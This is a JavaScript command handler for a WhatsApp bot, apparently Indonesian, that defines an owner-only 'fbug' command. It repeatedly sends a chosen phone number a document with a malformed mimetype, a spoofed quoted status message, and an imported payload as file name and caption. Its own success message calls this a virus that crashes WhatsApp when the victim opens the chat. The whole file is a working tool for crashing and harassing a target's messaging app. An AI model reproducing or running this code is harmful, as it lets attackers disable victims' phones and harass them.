import xeontext1 from "../../xeontext1.js"
let handler = async (m, { q, conn, text, command }) => {


if (!text) throw `*Jangan salah gunakan om yah*\n\nExample: ${command} 628XXXXXX/10`
let num = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
let jumlah = text.split('|')[1]

await m.reply(wait)
 
const fbug = {
  "key": { 
    "fromMe": false,
    "participant": '0@s.whatsapp.net',
    "remoteJid": 'status@broadcast' 
  },
  message: {
    "listResponseMessage": {
      title: `ð“‚º`
    }
  }
};



for (let i = 0; i < jumlah; i++) {
  setTimeout(() => {
    conn.sendMessage(num, {

document: {url: './settings.js'},

mimetype: `image/null`,

fileName: `${xeontext1}` ,

caption: `${xeontext1}`,

}, {quoted: fbug })

  }, i * 7000); // Delay setiap pengiriman selama 5 detik (5000 milidetik)
}
m.reply(`Sukses Mengirim ${command}\nKe Nomor: ${q} sebanyak ${text}\n\n*Note :* Virus ini aktif ketika korban membuka chat nya, maka WhatsApp akan crash hehe`)
}
//handler.help = ['fbug <nomer/jumlah>']
//handler.tags = ['tools']
handler.command = /^(fbug)$/i 
handler.owner = true 
export default handler